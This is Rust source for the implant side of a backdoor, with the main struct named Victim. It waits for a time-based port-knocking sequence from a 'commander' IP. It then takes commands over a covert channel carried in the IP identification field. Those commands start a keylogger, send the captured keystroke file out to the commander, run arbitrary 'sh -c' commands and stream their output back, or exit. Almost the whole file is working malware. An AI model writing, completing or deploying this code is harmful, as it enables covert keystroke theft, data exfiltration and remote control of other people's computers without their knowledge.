use std::net::{IpAddr, Ipv4Addr};
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use std::process::{Command, Stdio};
use std::io::Read;
use pnet::packet::tcp::TcpPacket;
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportReceiver};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::datalink::{self, NetworkInterface};

use keylogger::Control as KeylogControl;

mod keylogger;
mod covert;

const CMD_START_LOGGER:   u8 = 0x10;
const CMD_STOP_LOGGER:    u8 = 0x20;
const CMD_UNINSTALL:      u8 = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF:            u8 = 0x41;
const CMD_REQUEST_KEYLOG: u8 = 0x50;

pub struct SimpleRng {
    state: u64,
}

impl SimpleRng {
    pub fn new(seed: u64) -> Self {
        Self { state: seed }
    }

    pub fn next_u32(&mut self) -> u32 {
        self.state = self.state.wrapping_mul(6364136223846793005).wrapping_add(1);
        (self.state >> 32) as u32
    }

    pub fn gen_port(&mut self) -> u16 {
        1024 + (self.next_u32() % (65535 - 1024)) as u16
    }
}

pub fn generate_seed(ip: &Ipv4Addr, time_offset: i64) -> u64 {
    let ip_u32: u32 = (*ip).into();
    let current_time_step = (SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs() / 60) as i64;
    
    (ip_u32 as u64) ^ (current_time_step + time_offset) as u64
}

struct Victim {
    local_ip: Ipv4Addr,
    keylog_control_tx: Option<Sender<KeylogControl>>,
    keylog_data_rx:    Option<Receiver<String>>,
}

impl Victim {
    fn new() -> Self {
        let (_, local_ip) = Self::find_active_interface()
            .expect("No active network interface found");
        Self {
            local_ip,
            keylog_control_tx: None,
            keylog_data_rx:    None,
        }
    }

    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
        datalink::interfaces().into_iter().find(|iface| {
            iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty()
        }).and_then(|iface| {
            iface.ips.iter().find_map(|ip| {
                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
            })
        })
    }

    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, mut rx) = transport_channel(4096, protocol).unwrap();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        let mut knock_idx = 0;
        let mut commander_ip: Option<Ipv4Addr> = None;

        println!("[*] Dynamic Port Knocking Active. Waiting for sequence...");

        loop {
            // CURRENT Window Ports
            let seed_curr = generate_seed(&self.local_ip, 0);
            let mut rng_curr = SimpleRng::new(seed_curr);
            let seq_curr = [rng_curr.gen_port(), rng_curr.gen_port(), rng_curr.gen_port()];
            let ports_curr = (rng_curr.gen_port(), rng_curr.gen_port());

            // PREVIOUS Window Ports (Grace period for minute boundaries)
            let seed_prev = generate_seed(&self.local_ip, -1);
            let mut rng_prev = SimpleRng::new(seed_prev);
            let seq_prev = [rng_prev.gen_port(), rng_prev.gen_port(), rng_prev.gen_port()];
            let ports_prev = (rng_prev.gen_port(), rng_prev.gen_port());

            if let Ok((ip_pkt, _)) = rx_iter.next() {
                if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                    let src_ip = ip_pkt.get_source();
                    let dest_port = tcp_pkt.get_destination();

                    if let Some(locked_ip) = commander_ip {
                        if src_ip != locked_ip { continue; }
                    }

                    let match_curr = dest_port == seq_curr[knock_idx];
                    let match_prev = dest_port == seq_prev[knock_idx];

                    if match_curr || match_prev {
                        if knock_idx == 0 { commander_ip = Some(src_ip); }
                        knock_idx += 1;
                        println!("[*] Knock {}/3 matched (Port {})", knock_idx, dest_port);

                        if knock_idx == 3 {
                            let (tx, rx) = if match_curr { ports_curr } else { ports_prev };
                            println!("[+] Auth Success! Session Ports -> TX: {} | RX: {}", tx, rx);
                            return (src_ip, tx, rx);
                        }
                    } else {
                        if knock_idx > 0 { println!("[!] Sequence broken. Resetting."); }
                        knock_idx = 0;
                        commander_ip = None;
                    }
                }
            }
        }
    }

    pub fn run(&mut self) {
        let (commander_ip, tx_port, rx_port) = self.wait_for_commander();

        let (transmitter, _) = covert::CovertChannel::new(
            self.local_ip,
            commander_ip,
            tx_port,
            rx_port,
        );

        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, rx) = transport_channel(4096, protocol).unwrap();

        println!("[+] Session established with commander: {}", commander_ip);
        self.process_commands(rx, transmitter, commander_ip);
    }

    fn process_commands(&mut self, mut rx: TransportReceiver, transmitter: covert::CovertChannel, cmd_ip: Ipv4Addr) {
        let mut string_buffer = String::new();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            if let Some(ref mut data_rx) = self.keylog_data_rx {
                while let Ok(line) = data_rx.try_recv() {
                    for &b in line.as_bytes() {
                        transmitter.send_byte(b);
                    }
                }
            }

            if let Ok((ip_pkt, _)) = rx_iter.next() {
                if ip_pkt.get_source() != cmd_ip { continue; }

                if let Some(tcp_pkt) = TcpPacket::new(ip_pkt.payload()) {
                    if tcp_pkt.get_destination() == transmitter.config.listen_port {
                        let byte = (ip_pkt.get_identification() & 0xFF) as u8;

                        match byte {
                            CMD_START_LOGGER => self.start_keylogger(),
                            CMD_STOP_LOGGER  => self.stop_keylogger(),
                            CMD_REQUEST_KEYLOG => self.send_keylog_file(&transmitter),
                            CMD_UNINSTALL => std::process::exit(0),
                            b'\n' => {
                                self.execute_shell_async(string_buffer.clone(), transmitter.clone());
                                string_buffer.clear();
                            }
                            _ => {
                                if byte >= 32 && byte <= 126 {
                                    string_buffer.push(byte as char);
                                }
                            }
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(2));
        }
    }

    fn start_keylogger(&mut self) {
        let (ctrl_tx, ctrl_rx) = mpsc::channel::<KeylogControl>();
        let (data_tx, data_rx) = mpsc::channel::<String>();

        thread::spawn(move || {
            let _ = keylogger::run_with_control(ctrl_rx, data_tx);
        });

        self.keylog_control_tx = Some(ctrl_tx);
        self.keylog_data_rx = Some(data_rx);
    }

    fn stop_keylogger(&mut self) {
        if let Some(tx) = self.keylog_control_tx.take() {
            let _ = tx.send(KeylogControl::Stop);
        }
        self.keylog_data_rx = None;
    }

    fn send_keylog_file(&self, transmitter: &covert::CovertChannel) {
        let path = "./data/captured_keys.txt";
        if let Ok(meta) = std::fs::metadata(path) {
            if meta.len() > 0 {
                let _ = transmitter.send_file(path);
            }
        }
    }

    fn execute_shell_async(&self, cmd: String, transmitter: covert::CovertChannel) {
        thread::spawn(move || {
            let child = Command::new("sh")
                .arg("-c")
                .arg(&cmd)
                .stdout(Stdio::piped())
                .spawn();

            if let Ok(mut child) = child {
                if let Some(mut stdout) = child.stdout.take() {
                    let mut buffer = [0u8; 1];
                    while let Ok(n) = stdout.read(&mut buffer) {
                        if n == 0 { break; }
                        transmitter.send_byte(buffer[0]);
                        thread::sleep(Duration::from_millis(5));
                    }
                }
                let _ = child.wait();
            }
        });
    }
}

fn main() {
    Victim::new().run();
}
